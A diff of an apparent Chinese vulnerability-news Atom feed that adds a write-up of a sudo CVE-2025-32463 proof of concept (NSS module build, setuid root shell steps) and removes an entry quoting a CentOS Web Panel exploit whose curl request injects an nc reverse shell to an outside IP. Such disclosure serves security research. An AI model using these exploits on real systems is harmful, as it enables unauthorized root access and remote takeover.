@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-07-03T04:00:34.689Z</updated>
+  <updated>2025-07-03T04:45:14.820Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,59 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>sudo Local Privilege Escalation Vulnerability</title>
+    <link href="http://example.com/2025/07/03/github_2251832442/"/>
+    <id>http://example.com/2025/07/03/github_2251832442/</id>
+    <published>2025-07-03T04:45:14.823Z</published>
+    <updated>2025-07-03T04:45:14.820Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> sudo Local Privilege Escalation Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-32463</li></ul><p><strong>漏洞类型：</strong> 权限提升</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 该漏洞存在于Linux系统的sudo命令中，通过滥用<code>sudo -R</code>选项与自定义NSS模块结合使用，可以实现本地权限提升。攻击者可以利用此漏洞在具有sudo访问权限的情况下，以root权限执行任意代码，破坏容器和用户隔离。漏洞的根本原因在于<code>sudo -R</code>改变了根目录，但未丢弃特权或清理环境，且NSS模块可以从攻击者控制的新根路径加载。</p><p><strong>产品名称：</strong> sudo</p><p><strong>来源：</strong> <a href="https://github.com/Mikivirus0/sudoinjection">https://github.com/Mikivirus0/sudoinjection</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>.gitattributes</li><li>readme.md</li><li>screenshot.png</li><li>screenshot1.png</li><li>sudoinject.sh</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-32463-Local-Privilege-Escalation-via-sudo-R-NSS-Injection"><a href="#CVE-2025-32463-Local-Privilege-Escalation-via-sudo-R-NSS-Injection" class="headerlink" title="CVE-2025-32463: Local Privilege Escalation via sudo -R NSS Injection"></a>CVE-2025-32463: Local Privilege Escalation via <code>sudo -R</code> NSS Injection</h2><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>This PoC demonstrates <strong>local privilege escalation</strong> on Linux systems via abuse of the <code>sudo -R</code> option in conjunction with a custom NSS module. It targets the vulnerability <a href="https://github.com/pr0v3rbs/CVE-2025-32463_chwoot"><strong>CVE-2025-32463</strong></a>, which stems from unsafe handling of the <code>nsswitch.conf</code> and NSS shared libraries under a chroot environment.</p><p>This PoC, <strong><code>sudo2root</code></strong>, adapts the original technique by compiling a custom NSS module that leverages the <code>constructor</code> attribute to escalate privileges and drop a setuid root shell in <code>/usr/local/bin/.suidshell</code>.</p><hr><h3 id="Vulnerability-Details"><a href="#Vulnerability-Details" class="headerlink" title="Vulnerability Details"></a>Vulnerability Details</h3><ul><li><strong>Vulnerability</strong>: Improper input validation and unsafe use of the <code>-R</code> chroot flag by <code>sudo</code>.</li><li><strong>Impact</strong>: A local attacker with <code>sudo</code> access can execute arbitrary code as <strong>root</strong>, breaking container and user isolation.</li><li><strong>Root Cause</strong>:<ul><li><code>sudo -R</code> changes the root directory but <strong>does not drop privileges</strong> or <strong>sanitize the environment</strong>.</li><li>NSS modules are loaded even from attacker-controlled paths inside this new root.</li></ul></li><li><strong>Exploit Strategy</strong>:<ol><li>Create a fake root filesystem with malicious <code>nsswitch.conf</code> and custom <code>libnss_*</code> shared object.</li><li>Trick <code>sudo</code> into loading the attacker-controlled NSS library.</li><li>The shared object executes code on load (via <code>__attribute__((constructor))</code>), drops a setuid root shell, and escalates privileges.</li></ol></li></ul><hr><h3 id="PoC-Overview"><a href="#PoC-Overview" class="headerlink" title="PoC Overview"></a>PoC Overview</h3><h4 id="Key-Components"><a href="#Key-Components" class="headerlink" title="Key Components:"></a>Key Components:</h4><ol><li><p><strong><code>sudo2root.c</code></strong> – Malicious NSS module:</p><ul><li>Uses a constructor function that:<ul><li>Gains root via <code>setreuid(0,0)</code> and <code>setregid(0,0)</code></li><li>Writes a small C program for a root shell</li><li>Compiles it with <code>gcc</code></li><li>Sets correct SUID permissions</li></ul></li></ul></li><li><p><strong>Bash Exploit Script</strong>:</p><ul><li>Prepares the fake chroot with:<ul><li><code>etc/nsswitch.conf</code></li><li>Custom <code>libnss_/sudo2root1337.so.2</code> NSS module</li></ul></li><li>Launches the exploit via:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -R sudo2root sudo2root<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>Setuid Shell</strong>:</p><ul><li>Written to: <code>/usr/local/bin/.suidshell</code></li><li>Retains root on execution:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/local/bin/.suidshell <span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure></li></ul></li></ol><hr><h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x sudoinject.sh<br>./sudoinject.sh<br>````<br><br>After the exploit completes, run:<br><br>```bash<br>/usr/local/bin/.suidshell<br><span class="hljs-built_in">whoami</span>  <span class="hljs-comment"># =&gt; root</span><br></code></pre></td></tr></table></figure><hr><h3 id="File-Structure"><a href="#File-Structure" class="headerlink" title="File Structure"></a>File Structure</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">sudoinject.sh                 # Main exploit script<br>libnss_/sudo2root1337.so.2   # Malicious NSS module (compiled)<br>sudo2root/etc/nsswitch.conf  # Custom nsswitch pointing to fake module<br>/usr/local/bin/.suidshell    # Final setuid root shell<br></code></pre></td></tr></table></figure><hr><h3 id="Technical-Overview"><a href="#Technical-Overview" class="headerlink" title="Technical Overview:"></a>Technical Overview:</h3><h4 id="Exploiting-sudo-R"><a href="#Exploiting-sudo-R" class="headerlink" title="Exploiting sudo -R:"></a>Exploiting <code>sudo -R</code>:</h4><ul><li><code>sudo</code>’s <code>-R &lt;dir&gt;</code> flag changes the root directory before executing a command.</li><li>If this directory has a custom <code>nsswitch.conf</code> with <code>passwd: /libnss_&lt;name&gt;.so</code>, <code>sudo</code> loads it <strong>before dropping privileges</strong>.</li><li>This behavior allows arbitrary code execution as root.</li></ul><h4 id="NSS-Module-Execution"><a href="#NSS-Module-Execution" class="headerlink" title="NSS Module Execution:"></a>NSS Module Execution:</h4><ul><li><p>Shared object is compiled with:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -shared -fPIC -Wl,-init,exploit_constructor -o libnss_/sudo2root1337.so.2 sudo2root.c<br></code></pre></td></tr></table></figure></li><li><p>Constructor runs <strong>before</strong> any <code>main()</code> logic.</p></li><li><p>Creates and compiles a suid shell with:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">setreuid(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>); setregid(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>); execl(<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure></li><li><p>Sets permissions via:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chown</span> 0:0 .suidshell &amp;&amp; <span class="hljs-built_in">chmod</span> 4755 .suidshell<br></code></pre></td></tr></table></figure></li></ul><hr><h3 id="Screenshot-PoC"><a href="#Screenshot-PoC" class="headerlink" title="Screenshot (PoC)"></a>Screenshot (PoC)</h3><p><img src="/screenshot.png" alt="PoC Screenshot"><br><img src="/screenshot1.png" alt="PoC Screenshot"></p><hr><h3 id="Acknowledgments"><a href="#Acknowledgments" class="headerlink" title="Acknowledgments"></a>Acknowledgments</h3><ul><li>Original PoC Inspiration: <a href="https://github.com/pr0v3rbs/CVE-2025-32463_chwoot">pr0v3rbs&#x2F;CVE-2025-32463_chwoot</a></li><li>Exploit adapted and improved by: <code>MikiVirus</code></li></ul><hr><h3 id="📢-Disclaimer"><a href="#📢-Disclaimer" class="headerlink" title="📢 Disclaimer"></a>📢 Disclaimer</h3><blockquote><p>This code is provided <strong>for educational purposes only</strong>. Unauthorized use of this code on systems you do not own or have explicit permission to test is <strong>illegal</strong> and unethical. Always get proper authorization before conducting security testing.</p></blockquote><hr>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; sudo Local Privilege Escalation Vulnera</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+    <category term="权限提升" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>付费印度 Max 金融公司数据泄露</title>
+    <link href="http://example.com/2025/07/03/weixin_2877105151/"/>
+    <id>http://example.com/2025/07/03/weixin_2877105151/</id>
+    <published>2025-07-03T04:31:47.570Z</published>
+    <updated>2025-07-03T04:31:47.565Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/Q7X8o28RxJqi5M_JA9PepA">https://mp.weixin.qq.com/s/Q7X8o28RxJqi5M_JA9PepA</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/Q7X8o28RxJqi5M_JA9PepA&quot;&gt;https://mp.weixin.qq.c</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>BlackHatEvents twitter update</title>
@@ -476,58 +529,6 @@
       
     <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 🚨 所有网络安全领域的颠覆者们注意了！&lt;br&gt;在#sectorca 2025的黑帽初创企业焦点大赛中展示你的创新。获得曝光机会，与行业顶尖人才建</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>CentOS Web Panel 未授权远程代码执行漏洞</title>
-    <link href="http://example.com/2025/07/02/github_1170031665/"/>
-    <id>http://example.com/2025/07/02/github_1170031665/</id>
-    <published>2025-07-02T15:45:14.149Z</published>
-    <updated>2025-07-02T15:45:14.145Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> CentOS Web Panel 未授权远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-48703</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> CentOS Web Panel 存在未授权远程代码执行漏洞，攻击者可通过构造特定的请求在目标系统上执行任意命令。</p><p><strong>产品厂商：</strong> CentOS Web Panel</p><p><strong>产品名称：</strong> CentOS Web Panel</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/issues/20344">https://github.com/rapid7/metasploit-framework/issues/20344</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>Unauthenticated remote code execution in CentOS Web Panel - CVE-2025-48703</p><h4 id="Basic-example"><a href="#Basic-example" class="headerlink" title="Basic example"></a>Basic example</h4><p>Working exploit:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs command">$ curl -kis &#x27;https://127.0.0.1:52083/myuser/index.php?module=filemanager&amp;acc=changePerm&#x27; --data &#x27;fileName=.bashrc&amp;currentPath=/home/myuser&amp;t_total=`nc 1.2.3.4 9999 -e /bin/bash`&#x27;<br>$<br></code></pre></td></tr></table></figure><p>Courtesy of <a href="https://fenrisk.com/rce-centos-webpanel">https://fenrisk.com/rce-centos-webpanel</a></p><h4 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h4><p>Unauthenticated one-shot RCE on a popular web management panel is pretty cool.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; CentOS Web Panel 未授权远程代码执行漏洞&lt;/p&gt;
-&lt;p&gt;&lt;st</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>BlackHatEvents twitter update</title>
-    <link href="http://example.com/2025/07/02/twitter_3674883056/"/>
-    <id>http://example.com/2025/07/02/twitter_3674883056/</id>
-    <published>2025-07-02T15:00:27.275Z</published>
-    <updated>2025-07-02T15:00:27.276Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> #BHUSA培训“基础网络黑客技术”让参与者熟悉网络应用程序及网络安全问题的基本知识。在这为期两天的课程中，将讨论多种工具和技术，辅以系统化的黑客攻击各阶段方法。立即注册&gt;&gt; <a href="https://t.co/MQQK5CrU6S">https://t.co/MQQK5CrU6S</a></p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1940411430366265425">https://x.com/BlackHatEvents/status/1940411430366265425</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; #BHUSA培训“基础网络黑客技术”让参与者熟悉网络应用程序及网络安全问题的基本知识。在这为期两天的课程中，将讨论多种工具和技术，辅以系统化的黑客</summary>
       
     
     
